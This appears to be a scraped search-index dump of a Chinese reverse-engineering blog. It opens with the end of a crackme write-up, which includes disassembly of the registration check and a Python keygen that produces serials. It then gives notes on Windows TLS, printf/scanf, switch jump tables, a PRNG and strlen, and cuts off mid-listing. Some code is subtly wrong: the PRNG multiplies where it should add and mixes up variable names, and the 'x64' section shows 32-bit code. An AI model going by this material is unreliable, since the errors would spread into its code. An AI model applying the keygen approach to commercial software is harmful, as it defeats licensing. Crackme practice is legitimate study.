恭喜你0048C833 |. BA B4C84800 mov edx,壹只老虎.0048C8B4 ; 注册成功!请联系我!QQ:6098413140048C838 |. A1 D0EB4800 mov eax,dword ptr ds:[0x48EBD0] ; 茺H0048C83D |. 8B00 mov eax,dword ptr ds:[eax]0048C83F |. E8 F478FCFF call 壹只老虎.004541380048C844 |&gt; 33C0 xor eax,eax0048C846 |. 5A pop edx ; 0012FDDC0048C847 |. 59 pop ecx ; 0012FDDC0048C848 |. 59 pop ecx ; 0012FDDC0048C849 |. 64:8910 mov dword ptr fs:[eax],edx0048C84C |. 68 6EC84800 push 壹只老虎.0048C86E0048C851 |&gt; 8D45 84 lea eax,[local.31]0048C854 |. E8 0376F7FF call 壹只老虎.00403E5C0048C859 |. 8D45 EC lea eax,[local.5]0048C85C |. BA 05000000 mov edx,0x50048C861 |. E8 1A76F7FF call 壹只老虎.00403E800048C866 \\. C3 retn0048C867 .^ E9 F46FF7FF jmp 壹只老虎.004038600048C86C .^ EB E3 jmp short 壹只老虎.0048C8510048C86E . 5F pop edi ; 0012FDDC0048C86F . 5E pop esi ; 0012FDDC0048C870 . 5B pop ebx ; 0012FDDC0048C871 . 8BE5 mov esp,ebp0048C873 . 5D pop ebp ; 0012FDDC0048C874 . C3 retn 注册码这个注册机不是我写的 123456789101112131415161718192021222324252627282930313233343536def main(): # input while True: name = raw_input('please enter your name - ') if len(name) &lt; 10: print 'error, the min length of name is 10' elif len(name) &gt; 16: print 'error, the max length of name is 16' else: break # prepare name = name + 'i am Bin Laden' len_name = len(name) name_list = list(name) code_list = [''] # find the last name_last = name_list[len_name-1] # enum the 1st character of serial for i in range(0, 128): if (ord(name_last)*i)%26 + 65 == i: code_first = i code_list[0] = chr(i) break # caculate the other for i in range(6, len_name): temp = chr(ord(name_list[i-1])*code_first%26 + 65) code_list.insert(1, temp) # format the serial code_final = ''.join(code_list) print 'the seiral is: ',code_final if raw_input('press any key to exit...'): pass if __name__ == '__main__': main()","link":"/2020/01/01/%E7%9C%8B%E9%9B%AACrackMe002/"},{"title":"线程本地存储器","text":"C/C++运行期库要使用线程本地存储器。每个线程均被赋予自己的字符串指针，如果你的程序严重依赖全局变量或者静态变量，那么TLS能够解决它遇到的问题。 TLS动态TLS如需要使用动态TLS，应用程序可以调用一组4个函数。这些函数实际上是DLL用的最多的函数。 Windows用来管理TLS的内部数据结构： 每个标志均可设置为FREE或者INUSE，表示TLS时隙(slot)是否正在使用。微软保证至少TLS_MINIMUM_AVAILBLE位标志是可供使用的。TLS_MINIMUM_AVAILBLE再WinNT.h中被定为64。 如果需要使用动态TLS，必须使用TlsAlloc函数： 1DWORD TlsAlloc(); 这个函数命令系统对进程中的位标志进行扫描，找到一个FREE标志。随后系统将该标志位从FREE改为INUSE，并且TlsAlloc返回位数组中的标志的索引。DLL(程序)通常将该索引值 保存再一个全局变量中。 如果TlsAlloc在列表中找不到FREE标志，它就返回TLS_OUT_OF_INDEXES(在WinBase.h中被定义为0xFFFFFFFF)。当TlsAlloc第一次被调用，系统发现第一个标志是FREE，并且将其标志改为INUSE，同时TlsAlloc返回0。 当创建一个线程时，便分配一个TLS_MINIMUM_AVAILABEPVOID值得数组，并且将它初始化为0，然后由系统将它与线程联系起来 在能够将信息存储在线程得PVOID数组之前，必须知道数组中得哪个索引值可以使用，这就是前面调用TslAlloc索要达到得目的 如果要将一个值放入线程得数组中，可以使用TlsSetValue函数 12345BOOl TslSetValue( DWORD dwTlsIndex, //dwTlsIndex参数标识的索引处 PVOID pvTlsValue //pvoid数值); 线程在调用TlsSetValue时，可以改变它自己的数组，但是不可以改变其线程的TLS值 如果要在线程的数组中检索一个值，可以使用TlsGetValue函数 1PVOID TlsGetValue(DWORD dwTlsIndex); 该返回的返回值与索引dwTlsIndex处的TLS时隙联系起来。与TlsSetValue一样，TlsGetValue只查看属于调用线程的数组。 如果所有的线程都不需要保留TLS时隙的位置的时候，应该调用TlsFree： 1BOOL TlsFree(DWORD dwTlsIndex); 该函数告诉系统时隙不需要保留，由进程的位标志数组管理的INUSE标志再次被设置为FREE。如果线程在后面调用TlsAlloc，那么将来就分配该INUSE标志。如果TlsFree成功，函数将返回TRUE 使用动态TLS如果DLL使用TLS，那么当它用DLL_PROCESS_ATTACH标志为它调用DllMain函数的时候，它也调用TlsAlloc。当调用DLL_PROCESS_DETACH调用DllMain函数的时候，它就调用TlsFree。 TlsGetValue和TlsSetValue的调用是在调用DLL中包含的函数时进行的 静态TLS静态TLS也能够将数据和线程联系起来，比如说，你想要将起始时间和应用程序创建的每个线程联系起来，使用以下声明： 1__declspec(thread) DWORD gt_dwStartTime = 0; __declspec（thread）是微软给VC++编译器的一个修改符号，它告诉编译器，对应的变量应该存放可执行文件或DLL文件中它的自己的节中。后面的变量必须声明为函数中(或函数外)的一个全局变量或静态变量。不能声明一个局部变量。因为局部变量和特定的线程是相关的 当编译器对程序进行编译的时候，它将所有的TLS变量放入它们自己的节中，这个节的名字就是’.tls’。 为了使静态TLS能够运行，操作系统必须参与其操作。当你的应用程序加载到内存时，系统就寻找你的可执行文件中的”.tls”节，并且动态地分配一个足够大的内存块，以便存放所有的静态TLS变量。应用程序中的代码每次引用其中一个变量时，就要转换为已分配内存块中包含的一个内存位置。 如果进程创建了一个线程，那么系统就要捕获它并且自动分配另外一个内存块，以便存放新县城的静态TLS变量。新线程只拥有对它自己的静态TLS变量的访问权，不能访问属于其他线程的TLS变量","link":"/2019/10/12/%E7%BA%BF%E7%A8%8B%E6%9C%AC%E5%9C%B0%E5%AD%98%E5%82%A8%E5%99%A8/"},{"title":"逆向工程权威指南-printf","text":"主要为了学习printf的参数传递的过程 x86x86:传递3个参数使用MSVC 2010 express编译程序，可以得到以下汇编指令： 1234567#include &lt;stdio.h&gt;int main(){ printf(&quot;a=%d;b=%d;c=%d&quot;,1,2,3); return 0;} 汇编代码： 1234567891011121314151617181920212223242526$SG3849 DB 'a=%d;b=%d;c=%d', 00HCONST ENDSPUBLIC _mainEXTRN _printf:PROC; Function compile flags: /Odtp_TEXT SEGMENT_main PROC; File c:\\code\\reverse_code\\ջ\\printf\\printf\\main.cpp; Line 4 push ebp mov ebp, esp; Line 5 push 3 ;将3压入栈中，使用栈传递参数 push 2 push 1 push OFFSET $SG3849 call _printf add esp, 16 ; 00000010H; Line 6 xor eax, eax; Line 7 pop ebp ret 0_main ENDP_TEXT ENDSEND printf的参数传递以逆序存入栈中，第一个参数在最后出栈。 在32位环境下，32位地址指针和int类型数据都占据4字节空间。所以我们最后恢复ESP中的栈指针； 如果程序中连续的调用多个函数，且调用函数的指令之间不夹杂其他指令，那么编译器可能把释放参数存储空间的ADD ESP,x这个指令进行合并，一次性释放所有的空间； 12345678910111213push a1push a2call ......push a1push a2call ......push a1push a2push a3call ...add esp,24 ;一次性恢复栈空间指针 printf调试： Gcc编译后的printf12345678910111213141516171819202122; int __cdecl main(int argc, const char **argv, const char **envp)public _main_main proc nearargc= dword ptr 8argv= dword ptr 0Chenvp= dword ptr 10hpush ebpmov ebp, espand esp, 0FFFFFFF0hsub esp, 10hcall ___mainmov dword ptr [esp+0Ch], 3mov dword ptr [esp+8], 2mov dword ptr [esp+4], 1mov dword ptr [esp], offset aADBDCD ; &quot;a=%d,b=%d,c=%d&quot;call _printfmov eax, 0leaveretn_main endp 相比于MSVC的编译，GCC生成的程序仅在参数入栈的方式有区别， GCC没有使用PUSH/POP指令，而是直接对栈进行操作。 GCC和GDB在linux下，使用gcc编译的情况下，添加-g选项表示在可执行文件中生成debug信息 x64传递9个参数123456#include &lt;stdio.h&gt;int main(){ printf(&quot;a=%d,b=%d,c=%d,d=%d,e=%d,f=%d,g=%d,h=%d&quot;,1,2,3,4,5,6,7,8,9); return 0;} Win64使用RCX、RDX、R8、R9等寄存器传递前4个参数，使用栈来传递其余的参数 123456789101112131415161718192021222324252627282930313233PUBLIC _mainEXTRN _printf:NEAR_DATA SEGMENT$SG526 DB 'a=%d,b=%d,c=%d,d=%d,e=%d,f=%d,g=%d,h=%d', 00H_DATA ENDS_TEXT SEGMENT_main PROC NEAR; File printf.cpp; Line 3 push ebp mov ebp, esp; Line 4 push 9 push 8 push 7 push 6 push 5 push 4 push 3 push 2 push 1 push OFFSET FLAT:$SG526 call _printf add esp, 40 ; 00000028H; Line 5 xor eax, eax; Line 6 pop ebp ret 0_main ENDP_TEXT ENDSEND","link":"/2019/10/24/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%9D%83%E5%A8%81%E6%8C%87%E5%8D%97-printf/"},{"title":"逆向工程权威指南-scanf","text":"scanf 它是格式输入函数，即按用户指定的格式从键盘上把数据输入到指定的变量之中 指针简介如果直接向函数传递大型数组、结构体或者数据对象，程序的开销会很大，毫无疑问，使用指针将会降低开销。不过指针得作用不仅如此：如果不适用指针，而是使用调用方函数直接传递数组或结构体这种大型数据，那么参数得传递过程将会十分复杂。 在C/C++中，指针就是描述某个内存地址得数据。 X86系统使用体系32位数字（4字节数据）描述指针：x64系统则使用64位数字（8字节数据）。 在C/C++得编译过程中，编译器只会在类型检查的阶段才会检查指针的类型。在编译器生成的汇编代码中，没有指针类型的任意信息 X86123456789101112#include &lt;stdio.h&gt;int main(){ int x; printf(&quot;Enter X:\\n&quot;); scanf(&quot;%d&quot;,&amp;x); printf(&quot;You Entered %d...\\r\\n&quot;,x); return 0;} 汇编代码： 12345678910111213141516171819202122232425262728293031323334353637383940414243PUBLIC _mainEXTRN _printf:NEAREXTRN _scanf:NEAR_DATA SEGMENT$SG527 DB 'Enter X:', 0aH, 00H ORG $+2$SG528 DB '%d', 00H ORG $+1$SG529 DB 'You Entered %d...', 0dH, 0aH, 00H_DATA ENDS_TEXT SEGMENT_x$ = -4 ;size = 4_main PROC NEAR; File scanf.cpp; Line 4 push ebp mov ebp, esp push ecx ;栈内分配了4字节空间，用来存储局部变量x; Line 6 push OFFSET FLAT:$SG527 call _printf add esp, 4; Line 8 lea eax, DWORD PTR _x$[ebp] ;lea eax,[ebp-4] push eax push OFFSET FLAT:$SG528 call _scanf add esp, 8; Line 10 mov ecx, DWORD PTR _x$[ebp] push ecx push OFFSET FLAT:$SG529 call _printf add esp, 8; Line 11 xor eax, eax; Line 12 mov esp, ebp pop ebp ret 0_main ENDP_TEXT ENDSEND 变量x是局部变量； C/C++标准：函数体内部应当可以访问局部变量，且函数外部应该访问不到函数内部的局部变量。演变至今，人们不约而同的利用数据栈来存储局部变量 在函数开头处有一条”PUSH ECX”指令。因为函数尾部没有对应的”POP ECX”指令，所以它的作用不是保存ECX的值。 汇编宏_x$(值为-4)用于访问局部变量x，用来存储局部变量x 在函数运行的过程中，EBP一直指向当前的栈帧，这样，函数可以通过EBP+offset的方式访问本地变量、外部传入变量的函数参数。 ESP也可以用来访问本地变量，获取函数所需的运行参数。不过ESP的值经常变化，用起来并不方便。函数启动之初就会利用EBP寄存器保存ESP寄存器的值。 在32位系统中，经典的栈帧结构如下： EBP-8 局部变量#2，IDA标记位var_8 EBP-4 局部变量#1，IDA标记位var_4 EBP EBP的值 EBP+4 返回地址Refurn Address EBP+8 函数参数#1，IDA标记位arg_0 EBP+0xc 函数参数#2，IDA标记为arg_4 EBP+ox10 函数参数#3，IDA标记为arg_8 scanf的两个参数： 第一个参数是一个指针，它指向包含有”%d”的格式化字符串。 第二个参数是局部变量x的地址。 ​ lea eax, DWORD PTR _x$[ebp]指令将变量x的地址放入EAX寄存器中。“lea”能够将源操作数(第二个参数)给出的有效地址(offset)传送到目的寄存器(第一个参数)中去。 此处，LEA将EBP寄存器的值玉宏_x$(-4)求和，然后使用EAX寄存器存储这个计算结果；也就是等同于”lea eax,[ebp-4]”； MSVC+OllyDbg 这个值将通过栈传递给ECX寄存器，然后通过栈传递给printf函数 GCC全局变量在上面的程序中，如果x不是全局变量而是局部变量，那会是什么情况？一旦x是全局变量，函数内部的指令，以及整个程序中的任何部分都可以访问到它； 123456789101112#include &lt;stdio.h&gt;int x;int main(){ printf(&quot;Enter X:\\n&quot;); scanf(&quot;%d&quot;,&amp;x); printf(&quot;You Entered %d...\\r\\n&quot;,x); return 0;} x861234567891011121314151617181920212223242526272829303132333435363738394041424344PUBLIC ?x@@3HA ; x_BSS SEGMENT?x@@3HA DD 01H DUP (?) ; x_BSS ENDSPUBLIC _mainEXTRN _printf:NEAREXTRN _scanf:NEAR_DATA SEGMENT$SG527 DB 'Enter X:', 0aH, 00H ORG $+2$SG528 DB '%d', 00H ORG $+1$SG529 DB 'You Entered %d...', 0dH, 0aH, 00H_DATA ENDS_TEXT SEGMENT_main PROC NEAR; File scanf1.cpp; Line 4 push ebp mov ebp, esp; Line 6 push OFFSET FLAT:$SG527 call _printf add esp, 4; Line 8 push OFFSET FLAT:?x@@3HA ; x push OFFSET FLAT:$SG528 call _scanf add esp, 8; Line 10 mov eax, DWORD PTR ?x@@3HA ; x push eax push OFFSET FLAT:$SG529 call _printf add esp, 8; Line 11 xor eax, eax; Line 12 pop ebp ret 0_main ENDP_TEXT ENDSEND 与前面不同的是，x变量的存储空间是数据段(.data段)，反而没有使用数据栈。因而整个程序都可以直接访问全局变量x。可执行文件中，未经初始化的变量不会占用任何存储空间； 某些指令在变量访问这些未初始化的全局变量的时候，操作系统会分配一段数值为零的地址给它 但是我们对上述代码稍加改动，那么相对应的代码会变为: 12345int x = 10;_DATA SEGMENT_x DD 0aH.... 在上述指令中将初始化x。其中DD代表DWORD，表示x是32位的数据； 载入IDA中，如果不初始化变量x的例子中，有很多带”？”标记的变量，这是未初始化x变量的标记，这意味着在程序加载到内存之后，操作系统将为这些变量分配空间、并且填入数字零。这些未初始化的变量不占用内存空间，为了方便使用巨型数组之类的数据，人们做的刻意约定； MSVC+OllyDbg 全局变量x出现在数据段中，在调试器执行完push指令后，变量x的指针被压入栈； 此后，EAX寄存器将存储在这个地址的32位值，并将之传递给printf函数； scanf函数的状态监测123456789101112131415#include &lt;stdio.h&gt;int main(){ int x; printf(&quot;Enter X:&quot;); if(scanf(&quot;%d&quot;,&amp;x) == 1) { printf(&quot;You Scanf %d&quot;,x); } else { printf(&quot;Error&quot;); } return 0;} 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556PUBLIC _mainEXTRN _printf:NEAREXTRN _scanf:NEAR_DATA SEGMENT$SG527 DB 'Enter X:', 00H ORG $+3$SG529 DB '%d', 00H ORG $+1$SG530 DB 'You Scanf %d', 00H ORG $+3$SG532 DB 'Error', 00H_DATA ENDS_TEXT SEGMENT_x$ = -4_main PROC NEAR; File scanf3.cpp; Line 3 push ebp mov ebp, esp push ecx; Line 5 push OFFSET FLAT:$SG527 call _printf add esp, 4; Line 6 lea eax, DWORD PTR _x$[ebp] push eax push OFFSET FLAT:$SG529 call _scanf add esp, 8 cmp eax, 1 jne SHORT $L528; Line 8 mov ecx, DWORD PTR _x$[ebp] push ecx push OFFSET FLAT:$SG530 call _printf add esp, 8; Line 10 jmp SHORT $L531$L528:; Line 12 push OFFSET FLAT:$SG532 call _printf add esp, 4$L531:; Line 14 xor eax, eax; Line 15 mov esp, ebp pop ebp ret 0_main ENDP_TEXT ENDSEND CMP EAX,1指令对返回值进行比对，检查其值是否为1 JEN是条件转移的条件是在两值不相同时进行跳转 一般来说，跳转判断语句会成对的出现”CMP/jcc”，jcc的指令是检查标志位寄存器，然后判断是否进行跳转 x8612345678910111213141516171819202122232425262728293031323334353637383940.text:00401000 _main proc near ; CODE XREF: start+AF\u0019p.text:00401000.text:00401000 var_4 = dword ptr -4.text:00401000 argc = dword ptr 8.text:00401000 argv = dword ptr 0Ch.text:00401000 envp = dword ptr 10h.text:00401000.text:00401000 push ebp.text:00401001 mov ebp, esp.text:00401003 push ecx.text:00401004 push offset aEnterX ; &quot;Enter X:&quot;.text:00401009 call _printf.text:0040100E add esp, 4.text:00401011 lea eax, [ebp+var_4].text:00401014 push eax.text:00401015 push offset aD ; &quot;%d&quot;.text:0040101A call _scanf.text:0040101F add esp, 8.text:00401022 cmp eax, 1.text:00401025 jnz short loc_40103A.text:00401027 mov ecx, [ebp+var_4].text:0040102A push ecx.text:0040102B push offset aYouScanfD ; &quot;You Scanf %d&quot;.text:00401030 call _printf.text:00401035 add esp, 8.text:00401038 jmp short loc_401047.text:0040103A ; ---------------------------------------------------------------------------.text:0040103A.text:0040103A loc_40103A: ; CODE XREF: _main+25\u0018j.text:0040103A push offset aError ; &quot;Error&quot;.text:0040103F call _printf.text:00401044 add esp, 4.text:00401047.text:00401047 loc_401047: ; CODE XREF: _main+38\u0018j.text:00401047 xor eax, eax.text:00401049 mov esp, ebp.text:0040104B pop ebp.text:0040104C retn.text:0040104C _main endp.text:0040104C OllyDbg 执行scanf前后，变量x的值没有发生改变。在上述情况下，scanf函数仅仅返回0，并没有对变量进行赋值； 让我们修改一下这个程序，我们将EAX寄存器中的值修改为FFFFFFFF 我们把EAX的值人为的设定为1，程序将完成后续的操作，printf函数会在控制台里显示数据栈里变量x的值；","link":"/2019/10/25/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%9D%83%E5%A8%81%E6%8C%87%E5%8D%97-scanf/"},{"title":"逆向工程权威指南-switch","text":"switch/case用来选择进入哪个选项； switchcase 陈述较少得情况123456789101112131415161718192021222324252627282930#include &lt;stdio.h&gt;void f(int a){ switch (a) { case 0: { printf(&quot;zero\\r\\n&quot;); break; } case 1: { printf(&quot;one\\r\\n&quot;); break; } case 2: { printf(&quot;two\\r\\n&quot;); break; } default: printf(&quot;Something unknow\\r\\n&quot;); break; }}int main(){ f(2);} X86123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566_a$ = 8_f PROC NEAR; File switch.c; Line 3 push ebp mov ebp, esp push ecx; Line 5 mov eax, DWORD PTR _a$[ebp] mov DWORD PTR -4+[ebp], eax cmp DWORD PTR -4+[ebp], 0 je SHORT $L342 cmp DWORD PTR -4+[ebp], 1 je SHORT $L344 cmp DWORD PTR -4+[ebp], 2 je SHORT $L346 jmp SHORT $L348$L342:; Line 8 push OFFSET FLAT:$SG343 call _printf add esp, 4; Line 9 jmp SHORT $L339$L344:; Line 13 push OFFSET FLAT:$SG345 call _printf add esp, 4; Line 14 jmp SHORT $L339$L346:; Line 18 push OFFSET FLAT:$SG347 call _printf add esp, 4; Line 19 jmp SHORT $L339$L348:; Line 22 push OFFSET FLAT:$SG349 call _printf add esp, 4$L339:; Line 25 mov esp, ebp pop ebp ret 0_f ENDP_TEXT ENDSPUBLIC _main_TEXT SEGMENT_main PROC NEAR; Line 28 push ebp mov ebp, esp; Line 29 push 2 call _f add esp, 4; Line 30 pop ebp ret 0_main ENDP_TEXT ENDSEND 上面这些代码如果改写成C语言得话，可以写成： 1234567891011void f(int a){ if (a == 0) printf(&quot;zero\\r\\n&quot;); else if(a == 1) printf(&quot;One\\r\\n&quot;); else if(a == 2) printf(&quot;two\\r\\n&quot;); else printf(&quot;Something unknow\\r\\n&quot;);} 如果从汇编代码看，我们无法判断上述得函数是一个判断表达式较少得switch还是一组if语句。 OllyDbg使用OllyDbg来调试 这里传入了我们设定得参数2； 在这里我们可以看到EAX得值是00000002； 标志急促请你ZF被设置为0，代表着运算结果不为0； 函数参数当前为2，它位于0012FF70处得栈； case陈述较多得情况我们在上面得例子中多增加几个case； 12345678910111213141516171819202122232425262728293031323334353637383940#include &lt;stdio.h&gt;void f(int a){ switch (a) { case 0: { printf(&quot;zero\\r\\n&quot;); break; } case 1: { printf(&quot;one\\r\\n&quot;); break; } case 2: { printf(&quot;two\\r\\n&quot;); break; } case 3: { printf(&quot;three\\r\\n&quot;); break; } case 4: { printf(&quot;two\\r\\n&quot;); break; } default: printf(&quot;Something unknow\\r\\n&quot;); break; }}int main(){ f(2);} X86123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384_a$ = 8_f PROC NEAR; File switch1.c; Line 3 push ebp mov ebp, esp push ecx; Line 5 mov eax, DWORD PTR _a$[ebp] mov DWORD PTR -4+[ebp], eax cmp DWORD PTR -4+[ebp], 4 ;变量a得值与4做比较 ja SHORT $L352 mov ecx, DWORD PTR -4+[ebp] jmp DWORD PTR $L359[ecx*4]$L342:; Line 8 push OFFSET FLAT:$SG343 call _printf add esp, 4; Line 9 jmp SHORT $L339$L344:; Line 13 push OFFSET FLAT:$SG345 call _printf add esp, 4; Line 14 jmp SHORT $L339$L346:; Line 18 push OFFSET FLAT:$SG347 call _printf add esp, 4; Line 19 jmp SHORT $L339$L348:; Line 23 push OFFSET FLAT:$SG349 call _printf add esp, 4; Line 24 jmp SHORT $L339$L350:; Line 28 push OFFSET FLAT:$SG351 call _printf add esp, 4; Line 29 jmp SHORT $L339$L352:; Line 32 push OFFSET FLAT:$SG353 call _printf add esp, 4$L339:; Line 35 mov esp, ebp pop ebp ret 0$L359: DD $L342 DD $L344 DD $L346 DD $L348 DD $L350_f ENDP_TEXT ENDSPUBLIC _main_TEXT SEGMENT_main PROC NEAR; Line 38 push ebp mov ebp, esp; Line 39 push 2 call _f add esp, 4; Line 40 pop ebp ret 0_main ENDP_TEXT ENDSEND 这段代码可以被分成多个调用printf()函数得指令组，而且每组传递给printf()函数得参数各不相同； 如果指令计算a得值与4计算，小于或者等于4，则会计算a*4得积，在计算积与L359得和，并跳转到这个结果所指向得地址上； OllyDbg现在EAX == 2； 程序校验输入值是否大于4，因为2&lt;4，所以不会执行default操作； 接下来栈窗口选择数据窗口中跟随，在窗口中就可以看到偏移表；表中有5个32位得值； 现在得ECX寄存器中得值是2；所以选择表中第2个元素； case从句多对一得情况12345678910111213141516171819202122232425262728293031323334353637#include &lt;stdio.h&gt;void f(int a){ switch(a) { case 1: case 2: case 7: case 10: printf(&quot;1,2,7,10&quot;); break; case 3: case 4: case 5: case 6: printf(&quot;3,4,5,6&quot;); break; case 8: case 9: case 20: case 21: printf(&quot;8,9,21&quot;); break; case 22: printf(&quot;22&quot;); break; default: printf(&quot;default&quot;); break; }}int main(){ f(4);} X86123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990_a$ = 8_f PROC NEAR; File switch2.c; Line 6 mov eax, DWORD PTR _a$[esp-4] dec eax cmp eax, 21 ; 00000015H ja SHORT $L407 xor ecx, ecx mov cl, BYTE PTR $L414[eax] jmp DWORD PTR $L415[ecx*4]$L399:; Line 11 push OFFSET FLAT:$SG400 call _printf add esp, 4; Line 32 ret 0$L401:; Line 17 push OFFSET FLAT:$SG402 call _printf add esp, 4; Line 32 ret 0$L403:; Line 23 push OFFSET FLAT:$SG404 call _printf add esp, 4; Line 32 ret 0$L405:; Line 26 push OFFSET FLAT:$SG406 call _printf add esp, 4; Line 32 ret 0$L407:; Line 29 push OFFSET FLAT:$SG408 call _printf pop ecx; Line 32 ret 0 npad 3$L415: DD $L399 DD $L401 DD $L403 DD $L405 DD $L407$L414: DB 0 DB 0 DB 1 DB 1 DB 1 DB 1 DB 0 DB 2 DB 2 DB 0 DB 4 DB 4 DB 4 DB 4 DB 4 DB 4 DB 4 DB 4 DB 4 DB 2 DB 2 DB 3_f ENDP_TEXT ENDSPUBLIC _main_TEXT SEGMENT_main PROC NEAR; Line 36 push 4 call _f pop ecx; Line 37 ret 0_main ENDP_TEXT ENDSEND 上述代码会用到两个表：索引表、转移表","link":"/2019/10/29/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%9D%83%E5%A8%81%E6%8C%87%E5%8D%97-switch/"},{"title":"逆向工程权威指南-伪随机函数","text":"“线性同余法”大概是生成随机数的最简单方法，虽然现在的随机数不采用这种技术，但是它的原理简单(只涉及乘法、加法和与运算) 123456789101112131415161718#include &lt;stdint.h&gt;#define RNG_a 1664525#define RNF_c 1013904223static uint32_t rand_start;void My_stand(uint32_t init){ rand_state = init;}int my_rand(){ rand_state = rand_state*RNG_a; rand_state = rand_state*RNG_c; return rand_state &amp; 0x7fff;} x86","link":"/2019/11/10/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%9D%83%E5%A8%81%E6%8C%87%E5%8D%97-%E4%BC%AA%E9%9A%8F%E6%9C%BA%E5%87%BD%E6%95%B0/"},{"title":"逆向工程权威指南-参数获取","text":"调用方(caller)函数通过栈方向被调用方(callee)函数传递参数 x86MSVC123456789101112#include &lt;stdio.h&gt;int f(int a,int b,int c){ return a*b+c;}int main(){ printf(&quot;%d\\r\\n&quot;,f(1,2,3)); return 0;} 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647PUBLIC ?f@@YAHHHH@Z ; f_TEXT SEGMENT_a$ = 8_b$ = 12_c$ = 16?f@@YAHHHH@Z PROC NEAR ; f; File caller.cpp; Line 4 push ebp mov ebp, esp; Line 5 mov eax, DWORD PTR _a$[ebp] imul eax, DWORD PTR _b$[ebp] add eax, DWORD PTR _c$[ebp]; Line 6 pop ebp ret 0?f@@YAHHHH@Z ENDP ; f_TEXT ENDSPUBLIC _mainEXTRN _printf:NEAR_DATA SEGMENT$SG531 DB '%d', 0dH, 0aH, 00H_DATA ENDS_TEXT SEGMENT_main PROC NEAR; Line 9 push ebp mov ebp, esp; Line 10 push 3 push 2 push 1 call ?f@@YAHHHH@Z ; f add esp, 12 ; 0000000cH push eax push OFFSET FLAT:$SG531 call _printf add esp, 8; Line 11 xor eax, eax; Line 12 pop ebp ret 0_main ENDP_TEXT ENDSEND main函数把三个数字压入栈中，然后调用了f(int,int,int)。被调用方函数f()通过a$=8一类的汇编宏访问所需参数以及自定义的局部变量。只不过从被调用方函数的堆栈的角度来看，外部参考的偏移量是正值，而局部变量的偏移量是负值。当需要访问栈帧以外的数据时，被调用方函数可以把汇编宏(例如_a$)与EBP寄存器的值相加，从而求得所需地址； OllyDbg当f()函数读取第一个参数时，EBP的值指向栈帧，栈帧里的第一个值是EBP的原始状态，第二个值是返回地址RA，第三个值开始的三个值依此为函数里的第一个参数、第二个参数、第三个参数。 在访问第一个参数时，计算机需要把EBP的值加上8 GCC使用IDA查看编译出来的汇编指令 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556.text:0804841B public f.text:0804841B f proc near ; CODE XREF: main+17\u0019p.text:0804841B.text:0804841B a = dword ptr 8.text:0804841B b = dword ptr 0Ch.text:0804841B c = dword ptr 10h.text:0804841B.text:0804841B push ebp.text:0804841C mov ebp, esp.text:0804841E mov eax, [ebp+a].text:08048421 imul eax, [ebp+b].text:08048425 mov edx, eax.text:08048427 mov eax, [ebp+c].text:0804842A add eax, edx.text:0804842C pop ebp.text:0804842D retn.text:0804842D f endp.text:0804842D.text:0804842E.text:0804842E ; =============== S U B R O U T I N E =======================================.text:0804842E.text:0804842E ; Attributes: bp-based frame.text:0804842E.text:0804842E ; int __cdecl main(int argc, const char **argv, const char **envp).text:0804842E public main.text:0804842E main proc near ; DATA XREF: _start+17\u0018o.text:0804842E.text:0804842E var_4 = dword ptr -4.text:0804842E argc = dword ptr 0Ch.text:0804842E argv = dword ptr 10h.text:0804842E envp = dword ptr 14h.text:0804842E.text:0804842E lea ecx, [esp+4].text:08048432 and esp, 0FFFFFFF0h.text:08048435 push dword ptr [ecx-4].text:08048438 push ebp.text:08048439 mov ebp, esp.text:0804843B push ecx.text:0804843C sub esp, 4.text:0804843F push 3 ; c.text:08048441 push 2 ; b.text:08048443 push 1 ; a.text:08048445 call f.text:0804844A add esp, 0Ch.text:0804844D sub esp, 8.text:08048450 push eax.text:08048451 push offset format ; &quot;%d\\r\\n&quot;.text:08048456 call _printf.text:0804845B add esp, 10h.text:0804845E mov eax, 0.text:08048463 mov ecx, [ebp+var_4].text:08048466 leave.text:08048467 lea esp, [ecx-4].text:0804846A retn.text:0804846A main endp GCC的编译结果与MSVC的编译结果类似，不过不同之处是两个被调用方的函数(f和printf)没有还原栈指针ESP；","link":"/2019/10/26/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%9D%83%E5%A8%81%E6%8C%87%E5%8D%97-%E5%8F%82%E6%95%B0%E8%8E%B7%E5%8F%96/"},{"title":"逆向工程权威指南-字符串","text":"本节是对循环控制语句得应用； 字符串strlen我们参照stelen在MSVC得标准库中得实现； 123456789101112int my_strlen(const char *str){ const char *eos = str; while(*eos++); return (eos - str - 1);}int main(){ return my_strlen(&quot;hello&quot;);} X86123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051_str$ = 8_eos$ = -4_my_strlen PROC NEAR; File my_strlen.c; Line 3 push ebp mov ebp, esp push ecx; Line 4 mov eax, DWORD PTR _str$[ebp] mov DWORD PTR _eos$[ebp], eax$L340:; Line 5 mov ecx, DWORD PTR _eos$[ebp] movsx edx, BYTE PTR [ecx] mov eax, DWORD PTR _eos$[ebp] add eax, 1 mov DWORD PTR _eos$[ebp], eax test edx, edx je SHORT $L341 jmp SHORT $L340$L341:; Line 6 mov eax, DWORD PTR _eos$[ebp] sub eax, DWORD PTR _str$[ebp] sub eax, 1; Line 7 mov esp, ebp pop ebp ret 0_my_strlen ENDP_TEXT ENDSPUBLIC _main_DATA SEGMENT$SG344 DB 'hello', 00H_DATA ENDS_TEXT SEGMENT_main PROC NEAR; Line 10 push ebp mov ebp, esp; Line 12 push OFFSET FLAT:$SG344 call _my_strlen add esp, 4; Line 13 pop ebp ret 0_main ENDP_TEXT ENDSEND 这里出现了新的指令，MOVSX和TEST； movsx指令从内存中读取8位数据，并将它存储到32位寄存器中。这是为了保证有符号类型得数据在转换后数据保持不变； GCC12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061 .file &quot;strlen.c&quot; .text .globl my_strlen .type my_strlen, @functionmy_strlen:.LFB0: .cfi_startproc pushl %ebp .cfi_def_cfa_offset 8 .cfi_offset 5, -8 movl 